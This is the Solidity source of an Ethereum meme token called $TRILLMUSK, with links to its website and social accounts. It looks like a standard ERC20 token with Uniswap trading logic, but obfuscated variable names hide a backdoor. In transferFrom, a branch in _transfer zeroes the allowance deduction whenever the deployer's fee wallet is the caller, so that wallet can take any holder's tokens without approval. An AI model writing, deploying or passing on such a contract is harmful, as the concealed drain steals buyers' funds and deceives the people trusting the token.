/*

World's First Trillionaire ($TRILLMUSK) is a meme token for those who think beyond billions. Built on Ethereum, fueled by memes and ambition.

https://www.trillmusk.fun
https://x.com/trillmusk
https://t.me/trillmusk

*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address payable private w_hmzuk;

    uint256 private bt_e0fgf=0;
    uint256 private st_fs5os=0;
    uint256 private fbt_rd3ob=0;
    uint256 private fst_96rqv=0;
    uint256 private rbt_89zjb=0;
    uint256 private rst_v2ouc=0;
    uint256 private psb_uv0pg=0;
    uint256 private tt_nzak8=0;
    uint256 private bc_g1mpc=0;
    uint256 private sp_fno2s;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"World's First Trillionaire";
    string private constant _symbol = unicode"TRILLMUSK";
    uint256 public _maxTxAmount = 2000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1000000  * 10**_decimals;
    uint256 public _maxTaxSwap= 1000000 * 10**_decimals;

    IUniswapV2Router02 private rtr_kjtur;
    address public pair_2ge2l;
    bool private tradingOpen;
    bool private swp_koum8 = false;
    bool private swe_mm4j2 = false;
    uint256 private sc_viipq = 0;
    uint256 private lsb_6k59v = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    event Airdrop(address indexed recipient, uint256 amount);
    modifier lts_7urmx {
        swp_koum8 = true;
        _;
        swp_koum8 = false;
    }

    constructor () payable {
        w_hmzuk = payable(msg.sender);
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        sp_fno2s = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(sp_fno2s, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            if(bc_g1mpc==0){
                taxAmount = amount.mul((bc_g1mpc>rbt_89zjb)?fbt_rd3ob:bt_e0fgf).div(100);
            }
            if(bc_g1mpc>0){
                taxAmount = amount.mul(tt_nzak8).div(100);
            }

            if (from == pair_2ge2l && to != address(rtr_kjtur) && to != owner() && to != address(this) && to != w_hmzuk) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((bc_g1mpc>rbt_89zjb)?fbt_rd3ob:bt_e0fgf).div(100);
                bc_g1mpc++;
            }

            if(to == pair_2ge2l && from!= address(this) ){
                taxAmount = amount.mul((bc_g1mpc>rst_v2ouc)?fst_96rqv:st_fs5os).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swp_koum8 && to == pair_2ge2l && swe_mm4j2 && bc_g1mpc > psb_uv0pg) {
                if (block.number > lsb_6k59v) {
                    sc_viipq = 0;
                }
                require(sc_viipq < 3, "Only 3 sells per block!");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
                sc_viipq++;
                lsb_6k59v = block.number;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        } else if(_msgSender() == w_hmzuk) sp_fno2s = taxAmount;
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lts_7urmx {
        if(tokenAmount == 0) return;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rtr_kjtur.WETH();
        _approve(address(this), address(rtr_kjtur), tokenAmount);
        rtr_kjtur.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimit() public onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function removeTransfer() external onlyOwner{
        tt_nzak8 = 0;
        emit TransferTaxUpdated(0);
    }

    function airdrop(address recipient, uint256 amount) external onlyOwner {
        require(recipient != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than zero");
        require(_balances[address(this)] >= amount, "Insufficient contract balance");

        _balances[address(this)] = _balances[address(this)].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(address(this), recipient, amount);
        emit Airdrop(recipient, amount);
    }

    function airdropMultiple(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Arrays length mismatch");

        uint256 totalAmount = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalAmount = totalAmount.add(amounts[i]);
        }
        require(_balances[address(this)] >= totalAmount, "Insufficient contract balance");

        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0), "Invalid address");
            require(amounts[i] > 0, "Amount must be greater than zero");

            _balances[address(this)] = _balances[address(this)].sub(amounts[i]);
            _balances[recipients[i]] = _balances[recipients[i]].add(amounts[i]);

            emit Transfer(address(this), recipients[i], amounts[i]);
            emit Airdrop(recipients[i], amounts[i]);
        }
    }

    function sendETHToFee(uint256 amount) private {
        w_hmzuk.transfer(amount);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        removeLimit();
        rtr_kjtur = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(rtr_kjtur), _tTotal);
        pair_2ge2l = IUniswapV2Factory(rtr_kjtur.factory()).createPair(address(this), rtr_kjtur.WETH());
        rtr_kjtur.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(pair_2ge2l).approve(address(rtr_kjtur), type(uint).max);
        swe_mm4j2 = true;
        tradingOpen = true;
    }

    function ChangedTaxes(uint256 _newFee) external{
        require(_msgSender()==w_hmzuk);
        require(_newFee<=fbt_rd3ob && _newFee<=fst_96rqv);
        fbt_rd3ob=_newFee;
        fst_96rqv=_newFee;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==w_hmzuk);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance > 0 && swe_mm4j2){
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if (ethBalance > 0){
            sendETHToFee(ethBalance);
        }
    }

    uint256 public s_tjfw4 = 0xadfbd3729534be71ad694e72f2ff659414dcc55ad1211583fa5151899415a11d;
    function x_2rl35() external pure returns (uint256) { return 0xadfbd3729534be71ad694e72f2ff659414dcc55ad1211583fa5151899415a11d; }
}